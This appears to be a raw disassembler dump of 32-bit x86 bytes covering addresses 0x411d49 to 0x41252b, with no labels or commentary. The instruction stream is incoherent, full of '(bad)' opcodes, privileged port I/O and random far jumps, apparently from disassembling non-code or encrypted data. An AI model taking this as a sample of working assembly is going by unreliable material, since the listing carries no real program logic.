  411d49:	dec    edi
  411d4a:	int3   
  411d4b:	inc    edx
  411d4c:	test   esi,eax
  411d4e:	test   DWORD PTR [edi+0x13],ecx
  411d51:	retf   
  411d52:	pop    ss
  411d53:	ficom  WORD PTR fs:[eax+eax*8]
  411d57:	xchg   ebp,eax
  411d58:	inc    esp
  411d59:	adc    DWORD PTR [ebp-0x7c],ebp
  411d5c:	inc    esp
  411d5d:	xlat   BYTE PTR ds:[ebx]
  411d5e:	in     eax,0x9e
  411d60:	scas   al,BYTE PTR es:[edi]
  411d61:	xchg   esp,eax
  411d62:	sub    ah,bh
  411d64:	std    
  411d65:	pusha  
  411d66:	stos   BYTE PTR es:[edi],al
  411d67:	jnp    0x411d61
  411d69:	aaa    
  411d6a:	and    bl,BYTE PTR [ecx]
  411d6c:	inc    ebx
  411d6d:	icebp  
  411d6e:	repnz and al,0x3a
  411d71:	mov    dh,BYTE PTR [eax+ecx*1]
  411d74:	mov    edi,0x7d4da9c5
  411d79:	mov    ch,0x80
  411d7b:	ret    
  411d7c:	icebp  
  411d7d:	sbb    DWORD PTR [ecx],ebx
  411d7f:	dec    esp
  411d80:	sbb    ch,0x94
  411d83:	je     0x411deb
  411d85:	jmp    0x754:0xbeec4320
  411d8c:	int3   
  411d8d:	sbb    eax,0x8b6f57b5
  411d92:	rol    DWORD PTR [ebp-0x728291fc],1
  411d98:	icebp  
  411d99:	dec    esp
  411d9a:	popf   
  411d9b:	pop    es
  411d9c:	adc    DWORD PTR [ecx],ebp
  411d9e:	sar    ebx,cl
  411da0:	pop    ss
  411da1:	stos   BYTE PTR es:[edi],al
  411da2:	test   eax,0x19d15391
  411da7:	nop
  411da8:	fldcw  WORD PTR [eax+0x13]
  411dab:	inc    ebp
  411dac:	lahf   
  411dad:	xchg   edi,eax
  411dae:	shl    BYTE PTR [ecx-0x38],0x6f
  411db2:	lea    eax,[edx+0x4c1f1ae6]
  411db8:	nop
  411db9:	sahf   
  411dba:	inc    edi
  411dbb:	lods   eax,DWORD PTR ds:[esi]
  411dbc:	mov    esi,0xb256533b
  411dc1:	fisttp DWORD PTR [ebx]
  411dc3:	rcl    BYTE PTR [ecx+eiz*2+0x2f7c9ebb],1
  411dca:	adc    al,0x34
  411dcc:	ds cdq 
  411dce:	add    BYTE PTR [edi],ch
  411dd0:	rcr    BYTE PTR [ebp-0x6e],0x48
  411dd4:	jge    0x411e23
  411dd6:	arpl   WORD PTR [esi],si
  411dd8:	test   al,0x87
  411dda:	pop    ss
  411ddb:	dec    ecx
  411ddc:	ret    0x3e7d
  411ddf:	push   ss
  411de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411de1:	in     al,0xf1
  411de3:	iret   
  411de4:	ret    
  411de5:	loopne 0x411d82
  411de7:	push   ss
  411de8:	lahf   
  411de9:	dec    edi
  411dea:	mov    ecx,0x99f328c7
  411def:	test   al,0x33
  411df1:	shr    DWORD PTR ds:[edi+0x2671ad35],0xec
  411df9:	mov    bh,bh
  411dfb:	shl    DWORD PTR [edx-0x789e0b4e],0x47
  411e02:	cmp    dl,BYTE PTR [eax-0x3f]
  411e05:	and    DWORD PTR [ebx-0x56181265],esi
  411e0b:	jp     0x411da2
  411e0d:	sbb    DWORD PTR [ecx+0xa],esi
  411e10:	daa    
  411e11:	jnp    0x411e3c
  411e13:	adc    al,0xfd
  411e15:	mov    edx,0x7c7cacbe
  411e1a:	pop    es
  411e1b:	sbb    al,0x1a
  411e1d:	mov    esi,0x3ff38677
  411e22:	mov    WORD PTR cs:0xf1516b79,gs
  411e29:	dec    ecx
  411e2a:	sahf   
  411e2b:	ins    DWORD PTR es:[edi],dx
  411e2c:	repz icebp 
  411e2e:	add    eax,0xa9dd2cb
  411e33:	xor    DWORD PTR [edx+0x2e964f56],0xa6140636
  411e3d:	xchg   ebp,ecx
  411e3f:	mov    DWORD PTR [ebx+0x33],eax
  411e42:	inc    edx
  411e43:	test   esi,edx
  411e45:	test   DWORD PTR ds:0xb671f999,ecx
  411e4b:	nop
  411e4c:	cs mov cl,0x6
  411e4f:	jge    0x411e31
  411e51:	aaa    
  411e52:	jbe    0x411e99
  411e54:	js     0x411e84
  411e56:	(bad)  
  411e57:	dec    ebp
  411e58:	push   esi
  411e59:	sbb    ebp,DWORD PTR [esi-0x17]
  411e5c:	in     eax,0x40
  411e5e:	mov    ebp,0xee2c3a1c
  411e63:	cmc    
  411e64:	sahf   
  411e65:	call   DWORD PTR ds:0x48aa52c9
  411e6b:	mov    BYTE PTR [edi-0x21b0a0b9],ch
  411e71:	and    al,0xa0
  411e73:	adc    BYTE PTR [eax+ebx*4],bh
  411e76:	xor    al,0xbf
  411e78:	int3   
  411e79:	mov    WORD PTR [esi],ss
  411e7b:	aam    0xe6
  411e7d:	popf   
  411e7e:	pop    ds
  411e7f:	xchg   esp,eax
  411e80:	inc    ebx
  411e81:	retf   
  411e82:	cli    
  411e83:	mov    al,0x24
  411e85:	jg     0x411edb
  411e87:	sub    edi,DWORD PTR [ebx-0x50f2a03c]
  411e8d:	ins    BYTE PTR es:[edi],dx
  411e8e:	data16 je 0x411e2f
  411e91:	and    BYTE PTR [edi],0xc5
  411e94:	mov    ch,0x96
  411e96:	retf   
  411e97:	jecxz  0x411e94
  411e99:	xor    ch,BYTE PTR [eax]
  411e9b:	and    al,0x61
  411e9d:	push   esp
  411e9e:	int3   
  411e9f:	xor    al,0x87
  411ea1:	fs retf 0xa9cb
  411ea5:	or     al,ah
  411ea7:	std    
  411ea8:	xchg   BYTE PTR gs:[eax+0x53],cl
  411eac:	mov    edi,0xa2e94219
  411eb1:	inc    edi
  411eb2:	ffreep st(6)
  411eb4:	test   al,0x43
  411eb6:	mov    esi,0xd440de98
  411ebb:	cmp    BYTE PTR [ecx-0x167b27de],0x50
  411ec2:	mov    BYTE PTR [ecx+ecx*2],dh
  411ec5:	sub    ax,0x321
  411ec9:	xor    esp,DWORD PTR [edi+eax*4+0x70565cab]
  411ed0:	mov    ch,0xd
  411ed2:	ins    BYTE PTR es:[edi],dx
  411ed3:	std    
  411ed4:	xor    eax,0xcd934402
  411ed9:	outs   dx,DWORD PTR ds:[esi]
  411eda:	xchg   ebx,eax
  411edb:	outs   dx,BYTE PTR ds:[esi]
  411edc:	xor    DWORD PTR [eax-0x73],0xffffffb2
  411ee0:	scas   eax,DWORD PTR es:[edi]
  411ee1:	inc    ebp
  411ee2:	pop    edx
  411ee3:	inc    esi
  411ee4:	dec    esp
  411ee5:	xchg   esi,eax
  411ee6:	xchg   DWORD PTR [edx],esi
  411ee8:	dec    esi
  411ee9:	and    ebp,DWORD PTR [edx-0x15bc4874]
  411eef:	mov    esi,0xf9155144
  411ef4:	shl    esp,0xde
  411ef7:	lods   eax,DWORD PTR ds:[esi]
  411ef8:	dec    esi
  411ef9:	mov    eax,ebp
  411efb:	sub    BYTE PTR [edx-0x75],bl
  411efe:	addr16 pop ecx
  411f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f01:	mov    ch,0x24
  411f03:	stc    
  411f04:	lods   al,BYTE PTR ds:[esi]
  411f05:	sub    DWORD PTR [ecx+0x34],edi
  411f08:	jp     0x411ecb
  411f0a:	lea    ebx,[edi]
  411f0c:	into   
  411f0d:	push   DWORD PTR [ebx-0x728766ed]
  411f13:	sti    
  411f14:	mov    bh,0xf5
  411f16:	addr16 pop edx
  411f18:	dec    edi
  411f19:	in     al,dx
  411f1a:	aaa    
  411f1b:	xlat   BYTE PTR ds:[ebx]
  411f1c:	gs mov bl,0x82
  411f1f:	cmp    bl,BYTE PTR [ebx+ebp*8]
  411f22:	push   edx
  411f23:	push   ds
  411f24:	jmp    0x5d7:0xd6d502d6
  411f2b:	xlat   BYTE PTR ds:[ebx]
  411f2c:	mov    eax,ds:0x571c3c21
  411f31:	mov    eax,ds:0xc7a36888
  411f36:	pop    esp
  411f37:	xor    al,0xce
  411f39:	xchg   DWORD PTR [edx+0x5b1466d8],esp
  411f3f:	les    esi,FWORD PTR [esi]
  411f41:	arpl   WORD PTR [edi-0x38],ax
  411f44:	mov    ebx,0x43221e5a
  411f49:	nop
  411f4a:	retf   0xe659
  411f4d:	mov    ch,0xe2
  411f4f:	scas   eax,DWORD PTR es:[edi]
  411f50:	xor    BYTE PTR [ebp-0x18686617],ch
  411f56:	pop    ebx
  411f57:	add    BYTE PTR ds:0xcf8ea7ce,al
  411f5d:	sbb    ecx,DWORD PTR [edi-0x16]
  411f60:	ficomp WORD PTR [eax]
  411f62:	sub    esi,edx
  411f64:	pandn  mm2,mm0
  411f67:	or     ch,ah
  411f69:	je     0x411f88
  411f6b:	jbe    0x411f17
  411f6d:	into   
  411f6e:	add    ebp,DWORD PTR [esi]
  411f70:	push   ecx
  411f71:	add    BYTE PTR [ebx+0x46d18229],dh
  411f77:	fldcw  WORD PTR [esi+0x3a07f061]
  411f7d:	(bad)  
  411f7e:	fiadd  WORD PTR [ebx-0x5d2923d8]
  411f84:	rcr    eax,0x51
  411f87:	sbb    bh,bl
  411f89:	mov    ah,0x5f
  411f8b:	add    bh,dh
  411f8d:	(bad)  
  411f8e:	push   ebp
  411f8f:	cmp    eax,0x8767739c
  411f94:	stc    
  411f95:	mov    ?,WORD PTR [edi-0x14]
  411f98:	rcr    DWORD PTR [ebx+0xe63e255],1
  411f9e:	out    dx,eax
  411f9f:	in     al,0xe9
  411fa1:	out    dx,al
  411fa2:	jb     0x411f77
  411fa4:	pop    edx
  411fa5:	cmp    cl,dh
  411fa7:	(bad)  
  411fa9:	lds    ecx,FWORD PTR [ecx+0x46990b65]
  411faf:	push   0x2ae4c574
  411fb4:	outs   dx,DWORD PTR ds:[esi]
  411fb5:	inc    esi
  411fb6:	and    ecx,DWORD PTR [edx-0x7fbd5b5]
  411fbc:	js     0x412034
  411fbe:	adc    BYTE PTR [eax],al
  411fc0:	test   al,0x8a
  411fc2:	mov    al,0x77
  411fc4:	pop    ebp
  411fc5:	addr16 and al,0xca
  411fc8:	jge    0x411fa9
  411fca:	xchg   esi,eax
  411fcb:	adc    ecx,esp
  411fcd:	adc    edi,DWORD PTR [ebx+0x6e33908]
  411fd3:	push   cs
  411fd4:	ss adc esp,0x4d
  411fd8:	xchg   ecx,eax
  411fd9:	fidivr WORD PTR [esp+edx*1]
  411fdc:	jne    0x411fae
  411fde:	mov    DWORD PTR [ebx+0x1b],ecx
  411fe1:	test   BYTE PTR [ebx],dl
  411fe3:	dec    ebx
  411fe4:	mov    dh,0xe8
  411fe6:	rol    DWORD PTR [edi-0x38b9025e],1
  411fec:	dec    ebp
  411fed:	shl    DWORD PTR [ecx+0x131756d7],0xea
  411ff4:	sub    DWORD PTR [ecx],0x645b6122
  411ffa:	dec    eax
  411ffb:	adc    DWORD PTR [ecx],esi
  411ffd:	inc    eax
  411ffe:	xor    ah,BYTE PTR [edx+0x5263920f]
  412004:	adc    ch,ch
  412006:	mov    al,0xe6
  412008:	(bad)  
  412009:	in     eax,dx
  41200a:	div    DWORD PTR [ebx]
  41200c:	dec    ecx
  41200d:	mov    al,ds:0x65f06e4d
  412012:	and    DWORD PTR [edi-0x6eab83dd],eax
  412018:	xor    DWORD PTR [eax+0x3aafb2a6],eax
  41201e:	jo     0x6abfdc31
  412024:	push   eax
  412025:	mov    ah,0xf7
  412027:	fisttp DWORD PTR [edi-0x70]
  41202a:	outs   dx,BYTE PTR ds:[esi]
  41202b:	pushf  
  41202c:	cwde   
  41202d:	xchg   edi,eax
  41202e:	into   
  41202f:	push   ss
  412030:	sub    al,0x3b
  412032:	jae    0x41208a
  412034:	ja     0x4120ac
  412036:	inc    edi
  412037:	sahf   
  412038:	mov    DWORD PTR [edi],0x6a9da8ee
  41203e:	adc    eax,0x5
  412041:	xlat   BYTE PTR ds:[ebx]
  412042:	xor    eax,0xd14927e8
  412047:	mov    cl,0xf4
  412049:	popf   
  41204a:	jecxz  0x4120c3
  41204c:	cld    
  41204d:	dec    esi
  41204e:	pop    es
  41204f:	jae    0x41208e
  412051:	iret   
  412052:	or     ch,BYTE PTR [eax+0x7902b598]
  412058:	ins    DWORD PTR es:[edi],dx
  412059:	xor    BYTE PTR [ebx+eiz*8],dl
  41205c:	mov    esp,0x958ef902
  412061:	popa   
  412062:	das    
  412063:	aaa    
  412064:	mov    bl,0x80
  412066:	sbb    ebp,DWORD PTR [ecx+ebp*2+0x2d2e09e5]
  41206d:	daa    
  41206e:	xor    edi,edx
  412070:	out    0x1,al
  412072:	js     0x4120ec
  412074:	loope  0x412057
  412076:	jns    0x412050
  412078:	adc    DWORD PTR [edx],edi
  41207a:	lea    edx,[esi+ebx*4+0x46bdece]
  412081:	xor    eax,DWORD PTR [esi+0x76]
  412084:	jne    0x41204c
  412086:	clc    
  412087:	stc    
  412088:	in     eax,0x39
  41208a:	mov    esi,0xaf10244f
  41208f:	mov    al,0x7
  412091:	stos   DWORD PTR es:[edi],eax
  412092:	sub    eax,0xafec30c3
  412097:	sub    eax,DWORD PTR [esi-0xca1af57]
  41209d:	nop
  41209e:	mov    cl,0xc8
  4120a0:	or     al,0x62
  4120a2:	pop    ss
  4120a3:	hlt    
  4120a4:	js     0x412070
  4120a6:	out    0xa0,al
  4120a8:	and    DWORD PTR ds:0xa8de4f4f,0x555b3b04
  4120b2:	mov    edx,0x4423a5fd
  4120b7:	adc    DWORD PTR [ecx-0x1e6a1c9],ecx
  4120bd:	jmp    0xc362578c
  4120c2:	imul   eax,DWORD PTR [ecx+esi*8],0x27
  4120c6:	cmp    ebx,eax
  4120c8:	sub    esi,edx
  4120ca:	jns    0x41206f
  4120cc:	gs retf 
  4120ce:	push   cs
  4120cf:	jmp    0xe5302a47
  4120d4:	add    eax,0x5628ccb1
  4120d9:	leave  
  4120da:	imul   esi,DWORD PTR [ebp+0x3ba0b652],0xffffff99
  4120e1:	pop    edx
  4120e2:	ret    0xa6bc
  4120e5:	sbb    al,0xa9
  4120e7:	adc    DWORD PTR [esi-0x495e0dea],0x181276ab
  4120f1:	pusha  
  4120f2:	dec    edx
  4120f3:	add    al,0xe
  4120f5:	int    0x4a
  4120f7:	jge    0x412096
  4120f9:	sahf   
  4120fa:	(bad)  
  4120fb:	in     eax,dx
  4120fc:	int    0x39
  4120fe:	shl    BYTE PTR [ebp-0x7a],1
  412101:	mov    BYTE PTR [ebx],al
  412103:	and    BYTE PTR [edi],dl
  412105:	sub    esi,eax
  412107:	cmp    BYTE PTR [eax+esi*1+0x56f501ff],bl
  41210e:	push   cs
  41210f:	lds    edi,FWORD PTR [ecx+edx*4]
  412112:	mov    eax,ds:0xb5178ec3
  412117:	add    bh,BYTE PTR cs:[edx+edx*1]
  41211b:	sbb    eax,0x25762b91
  412120:	mov    ds:0x6efe5586,al
  412125:	mov    eax,ds:0xb4bad294
  41212a:	je     0x41219d
  41212c:	jo     0x4120eb
  41212e:	mov    eax,ds:0x65c95d3f
  412133:	mov    bh,0x8f
  412135:	sbb    BYTE PTR [edx-0x34],cl
  412138:	shl    DWORD PTR [edx+esi*4+0x56e367da],cl
  41213f:	sub    bh,al
  412141:	(bad)  
  412142:	int3   
  412143:	in     al,0x9f
  412145:	add    eax,0xcf576eaf
  41214a:	sbb    al,0xe4
  41214c:	imul   eax,DWORD PTR [edx],0xd15410d8
  412152:	add    DWORD PTR [ebp+0x7b468f16],0x13dee0b6
  41215c:	js     0x412176
  41215e:	ror    BYTE PTR [edi],cl
  412160:	mov    BYTE PTR [edx+0x6e],cl
  412163:	adc    bl,BYTE PTR [edi*2+0xeef5fab]
  41216a:	pop    edi
  41216b:	mov    bl,0x70
  41216d:	adc    esp,DWORD PTR [ebp+0x7e]
  412170:	or     eax,0x51776118
  412175:	dec    eax
  412176:	btc    DWORD PTR es:[ecx],ebx
  41217a:	clc    
  41217b:	jnp    0x41210a
  41217d:	mov    bh,ch
  41217f:	sub    eax,0x348c2097
  412184:	adc    eax,0xb03e1b99
  412189:	loope  0x41219e
  41218b:	mov    cl,0x9c
  41218d:	sbb    BYTE PTR [ecx],0xfc
  412190:	and    BYTE PTR [eax],bl
  412192:	xor    al,0x61
  412194:	popf   
  412195:	cdq    
  412196:	ds test eax,0x58a7875f
  41219c:	or     DWORD PTR [esi+0x1],eax
  41219f:	in     eax,dx
  4121a0:	(bad)  
  4121a1:	dec    eax
  4121a2:	push   esp
  4121a3:	sub    BYTE PTR [eax],0x85
  4121a6:	shr    DWORD PTR [eax],cl
  4121a8:	icebp  
  4121a9:	aad    0xa5
  4121ab:	arpl   bx,ax
  4121ad:	xchg   esp,eax
  4121ae:	(bad)  
  4121af:	push   eax
  4121b0:	pop    ebx
  4121b2:	dec    esp
  4121b3:	lods   eax,DWORD PTR ds:[esi]
  4121b4:	(bad)  
  4121b5:	fisubr WORD PTR [ecx+eiz*2]
  4121b8:	dec    eax
  4121b9:	xor    al,0xdb
  4121bb:	shl    BYTE PTR [esi+ebx*4+0x2],cl
  4121bf:	test   DWORD PTR [edi+esi*8+0x6c59a6c1],0x982d6b99
  4121ca:	and    DWORD PTR [ebx-0x3b],ebx
  4121cd:	xchg   DWORD PTR [edx],esi
  4121cf:	xchg   ebx,eax
  4121d0:	inc    esp
  4121d1:	add    ebp,ecx
  4121d3:	add    ch,BYTE PTR [esi-0xb]
  4121d6:	mov    ebx,0x46cf1548
  4121db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121dc:	pop    eax
  4121dd:	test   eax,0x8b38599b
  4121e2:	lods   eax,DWORD PTR gs:[esi]
  4121e4:	repnz dec ebx
  4121e6:	and    esp,edx
  4121e8:	jmp    0x45eb687
  4121ed:	lea    edi,[eax-0x2b]
  4121f0:	mov    edi,0x76089cdd
  4121f5:	cdq    
  4121f6:	dec    eax
  4121f7:	push   edi
  4121f8:	nop
  4121f9:	xchg   edx,eax
  4121fa:	(bad)  
  4121fb:	xlat   BYTE PTR ds:[ebx]
  4121fc:	andnps xmm3,xmm1
  4121ff:	fistp  WORD PTR [edx+eax*4+0xe]
  412203:	xchg   esi,eax
  412204:	sahf   
  412205:	fisttp WORD PTR [ebp+0x5a659c07]
  41220b:	ret    0x8a61
  41220e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41220f:	sub    dh,cl
  412211:	jns    0x412241
  412213:	jl     0x412236
  412215:	popa   
  412216:	or     eax,0xf4a8e9cf
  41221b:	mov    dh,BYTE PTR [eax-0x42]
  41221e:	mov    bl,0x84
  412220:	daa    
  412221:	xchg   ebx,eax
  412222:	lds    ebx,FWORD PTR [edx-0x62303f5f]
  412228:	sar    DWORD PTR [esi-0x112d2814],0x95
  41222f:	icebp  
  412230:	aad    0x82
  412232:	inc    ebp
  412233:	pop    eax
  412234:	cmp    BYTE PTR [ebp+ebp*8+0x3d],al
  412238:	cwde   
  412239:	mov    ecx,0xf41029f0
  41223e:	cmp    DWORD PTR [ebp-0x7d9ec764],0x569ec660
  412248:	fucom  st(2)
  41224a:	jo     0x4122a4
  41224c:	ins    DWORD PTR es:[edi],dx
  41224d:	mov    esp,0x638fb8c1
  412252:	pop    esi
  412253:	scas   eax,DWORD PTR es:[edi]
  412254:	xchg   DWORD PTR [edx-0x3e],ecx
  412257:	push   ebp
  412258:	dec    eax
  412259:	xor    al,0x69
  41225b:	retf   
  41225c:	mov    ch,0x58
  41225e:	add    DWORD PTR [ebx+0x630b537b],ebx
  412264:	loope  0x4121f1
  412266:	fcom   DWORD PTR [ebx-0x101f985]
  41226c:	retf   
  41226d:	jmp    0x790b:0x9bc028dc
  412274:	std    
  412275:	out    0x6a,al
  412277:	ret    
  412278:	retf   
  412279:	add    DWORD PTR [edi+0x1749e745],0x17
  412280:	ror    BYTE PTR [edi-0x60],0x75
  412284:	cwde   
  412285:	addr16 lahf 
  412287:	sub    edx,esp
  412289:	retf   0xfe14
  41228c:	mov    cl,0xa5
  41228e:	fist   DWORD PTR [ebx+0x4f]
  412291:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412292:	retf   
  412293:	dec    esi
  412294:	mov    ecx,0x4ee4f2fe
  412299:	fwait
  41229a:	sub    ebp,esp
  41229c:	mov    edx,0x9304ed28
  4122a1:	xchg   ebp,esp
  4122a3:	mov    bh,0x36
  4122a5:	lea    esi,[edi+0x2]
  4122a8:	fsub   QWORD PTR [edx+0x13f65591]
  4122ae:	xor    BYTE PTR [esi],ah
  4122b0:	arpl   WORD PTR [ecx+0x3c],bx
  4122b3:	in     eax,dx
  4122b4:	inc    ebp
  4122b5:	jne    0x4122f0
  4122b7:	mov    ebp,0xf829d1fc
  4122bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122be:	xor    BYTE PTR [esi+0x72],al
  4122c1:	imul   ecx,esi,0xea520059
  4122c7:	xlat   BYTE PTR ds:[ebx]
  4122c8:	mov    ebx,0x65db3216
  4122cd:	int    0x76
  4122cf:	push   eax
  4122d0:	xor    esi,0x262bbb5b
  4122d6:	dec    edi
  4122d7:	mov    al,0x74
  4122d9:	int3   
  4122da:	sbb    eax,ecx
  4122dc:	pop    esp
  4122dd:	into   
  4122de:	push   esp
  4122df:	xchg   bh,ch
  4122e1:	repnz xor DWORD PTR [eax],esp
  4122e4:	jae    0x41227c
  4122e6:	(bad)  [ebp+0x17422bf3]
  4122ec:	mov    DWORD PTR [ebp+esi*8-0x75],0xc55b821a
  4122f4:	and    al,0xce
  4122f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122f7:	jb     0x41235a
  4122f9:	push   ds
  4122fa:	sbb    ah,BYTE PTR [eax+0x3c94a7aa]
  412300:	sub    eax,0x71eb6766
  412305:	add    DWORD PTR [edi],0x68
  412308:	xchg   ebx,eax
  412309:	or     cl,BYTE PTR [ebp-0x6c]
  41230c:	inc    eax
  41230d:	inc    esp
  41230e:	daa    
  41230f:	fild   QWORD PTR [ecx+edi*1+0x3ddfdaba]
  412316:	lahf   
  412317:	sbb    BYTE PTR [edx],0x4f
  41231a:	jp     0x412362
  41231c:	mov    WORD PTR [edi+ebp*1+0x16068324],?
  412323:	sub    al,0xcc
  412325:	scas   al,BYTE PTR es:[edi]
  412326:	iret   
  412327:	out    dx,al
  412328:	and    ecx,esp
  41232a:	mov    BYTE PTR [eax+0x36413c30],al
  412330:	jmp    0x4122bd
  412332:	neg    DWORD PTR [esp+eiz*8]
  412335:	dec    edi
  412336:	iret   
  412337:	mov    ebp,0x55009573
  41233c:	loope  0x4122d9
  41233e:	fild   DWORD PTR [edx]
  412340:	mov    DWORD PTR [ecx],ebx
  412342:	cwde   
  412343:	pop    es
  412344:	daa    
  412345:	ficom  DWORD PTR [ecx]
  412347:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412348:	sub    DWORD PTR [ecx+0x60],ebp
  41234b:	mov    ah,0xa7
  41234d:	inc    ecx
  41234e:	std    
  41234f:	enter  0x464c,0xde
  412353:	sub    eax,esi
  412355:	rcr    BYTE PTR [eax+0x16],cl
  412358:	rcr    DWORD PTR [ecx-0x38],1
  41235b:	and    ch,BYTE PTR [ebp-0x787c3689]
  412361:	(bad)  
  412363:	mov    al,ds:0xac00eba8
  412368:	or     DWORD PTR [ebp+0x77],edx
  41236b:	test   eax,0x6639942e
  412370:	inc    eax
  412371:	cmp    DWORD PTR [edi],edx
  412373:	sbb    DWORD PTR [ecx+eiz*8],ebp
  412376:	pop    ebp
  412377:	or     eax,0x6e780cf7
  41237c:	mov    WORD PTR [esi+edi*2+0x24],es
  412380:	xor    bh,cl
  412382:	fild   WORD PTR [edi+0x5c]
  412385:	dec    ecx
  412386:	repz pop esi
  412388:	adc    edi,0x6ee7a76e
  41238e:	add    ah,al
  412390:	and    esp,DWORD PTR [ebp-0x48]
  412393:	adc    eax,0x8dcd42ef
  412398:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412399:	lea    edx,[esi-0x79810218]
  41239f:	loopne 0x4123dc
  4123a1:	fmul   DWORD PTR [eax]
  4123a3:	cmp    BYTE PTR [esi+0x26e5eaf],0xba
  4123aa:	mov    ch,0xac
  4123ac:	int3   
  4123ad:	push   ds
  4123ae:	sahf   
  4123af:	dec    ecx
  4123b0:	and    al,0x2a
  4123b2:	xor    al,0xba
  4123b4:	rep ins BYTE PTR es:[edi],dx
  4123b6:	and    eax,0x585d9c7f
  4123bb:	mov    ds:0xaf24f805,al
  4123c0:	or     eax,0x616dd9e3
  4123c5:	call   0x20:0xd689abfe
  4123cc:	stc    
  4123cd:	ror    DWORD PTR [edi-0x1120230e],0xe6
  4123d4:	add    esi,DWORD PTR [eax+edx*8+0x3778a0d1]
  4123db:	loopne 0x4123a8
  4123dd:	push   edi
  4123de:	ja     0x41244e
  4123e0:	mov    ch,0xc2
  4123e2:	fucom  st(7)
  4123e4:	out    dx,eax
  4123e5:	outs   dx,BYTE PTR ds:[esi]
  4123e6:	sub    al,0xc5
  4123e8:	mov    edi,0xf736491c
  4123ed:	jno    0x41239f
  4123ef:	sub    al,0x82
  4123f1:	pusha  
  4123f2:	fs bswap edx
  4123f5:	inc    edx
  4123f6:	(bad)  
  4123f7:	out    dx,eax
  4123f8:	je     0x41237d
  4123fa:	ret    0x3edc
  4123fd:	pop    ss
  4123fe:	aad    0xc6
  412400:	stos   DWORD PTR es:[edi],eax
  412401:	mov    eax,0x109579c0
  412406:	mov    al,ss:0xb9bb10a2
  41240c:	or     al,BYTE PTR [ecx+0x6bbd5581]
  412412:	(bad)  [esi-0x63]
  412415:	(bad)  
  412416:	into   
  412417:	cmp    eax,edx
  412419:	ret    0x421
  41241c:	pop    edi
  41241d:	loop   0x41243a
  41241f:	call   0xb07c:0x9d1915b1
  412426:	lock pop esp
  412428:	push   edx
  412429:	mov    eax,ds:0xfa028258
  41242e:	xor    eax,DWORD PTR [esi+edi*4-0x411b7d28]
  412435:	xor    edi,DWORD PTR [ecx-0xf]
  412438:	call   0x9c70:0x52fc307e
  41243f:	mov    ecx,0x965013b9
  412444:	push   es
  412445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412446:	mov    WORD PTR [esi-0x106f400e],?
  41244c:	daa    
  41244d:	push   ecx
  41244e:	enter  0x54d6,0x37
  412452:	sbb    dl,BYTE PTR ds:0x441ef9f2
  412458:	inc    eax
  412459:	hlt    
  41245a:	cdq    
  41245b:	sbb    esi,DWORD PTR [ebx]
  41245d:	inc    ecx
  41245e:	xchg   esp,ebp
  412460:	js     0x4123e9
  412462:	ins    BYTE PTR es:[edi],dx
  412463:	dec    eax
  412464:	pop    ecx
  412465:	push   eax
  412466:	dec    DWORD PTR [ecx-0x7883ad31]
  41246c:	or     ebx,edx
  41246e:	pop    ecx
  41246f:	push   ebx
  412470:	dec    eax
  412471:	pop    esi
  412472:	dec    edx
  412473:	fucomp st(1)
  412475:	push   es
  412476:	adc    al,0x76
  412478:	xchg   edi,eax
  412479:	outs   dx,BYTE PTR ds:[esi]
  41247a:	pop    es
  41247b:	xchg   ebp,eax
  41247c:	pop    edi
  41247d:	dec    ecx
  41247e:	iret   
  41247f:	xor    eax,0x549d140e
  412484:	xchg   ebx,eax
  412485:	out    0xd8,eax
  412487:	add    al,0x8d
  412489:	mov    dl,0xc3
  41248b:	int3   
  41248c:	inc    ecx
  41248d:	mov    es,WORD PTR [edx]
  41248f:	in     al,dx
  412490:	jns    0x412487
  412492:	dec    ecx
  412493:	pop    eax
  412494:	inc    eax
  412495:	daa    
  412496:	xchg   edx,eax
  412497:	mov    BYTE PTR [ebx-0x156b6729],dl
  41249d:	xor    al,cl
  41249f:	in     eax,0x66
  4124a1:	es ins BYTE PTR es:[edi],dx
  4124a3:	fstp   QWORD PTR [ebx+edi*8]
  4124a6:	pop    ds
  4124a7:	dec    esp
  4124a8:	dec    esp
  4124a9:	adc    bl,ch
  4124ab:	mov    al,0x9f
  4124ad:	sbb    esp,DWORD PTR [ebp+ecx*8+0x6]
  4124b1:	addr16 xor eax,0x721ee518
  4124b7:	ror    ebp,0x30
  4124ba:	ret    0x2743
  4124bd:	pop    esi
  4124be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124bf:	fadd   DWORD PTR [edx]
  4124c1:	push   ebp
  4124c2:	aaa    
  4124c3:	int3   
  4124c4:	cmp    BYTE PTR [ecx+0x6b],ch
  4124c7:	push   eax
  4124c8:	ret    0xcd6
  4124cb:	and    ebp,DWORD PTR [edi+eax*2+0x35147f7e]
  4124d2:	pop    ss
  4124d3:	sti    
  4124d4:	jmp    0x4124ae
  4124d6:	mov    ebx,0x336fe0c6
  4124db:	push   ecx
  4124dc:	jbe    0x4124f4
  4124de:	ins    DWORD PTR es:[edi],dx
  4124df:	pop    es
  4124e0:	call   0xd2f2:0xf449eb26
  4124e7:	fnsave [eiz*8-0x31d6c693]
  4124ee:	(bad)  [edx]
  4124f0:	call   0xb966:0x5ff8afea
  4124f7:	loopne 0x4124d2
  4124f9:	cwde   
  4124fa:	in     al,0x1c
  4124fc:	cmc    
  4124fd:	cmp    al,0x55
  4124ff:	cs cdq 
  412501:	inc    edx
  412502:	rcr    BYTE PTR [eax],cl
  412504:	jne    0x41252a
  412506:	push   ds
  412507:	add    BYTE PTR [ecx],dh
  412509:	fs inc eax
  41250b:	adc    BYTE PTR [eax+0x5df7f2ae],dh
  412511:	dec    ebp
  412512:	pop    es
  412513:	inc    ebx
  412514:	(bad)  
  412516:	sub    eax,0x29f2a57c
  41251b:	cmp    eax,0xe34713bf
  412520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412521:	jns    0x412569
  412523:	(bad)  
  412524:	push   cs
  412525:	jecxz  0x412590
  412527:	into   
  412528:	pop    edx
  412529:	push   ds
  41252a:	(bad)  
  41252b:	lods   eax,DWORD PTR es:[esi]
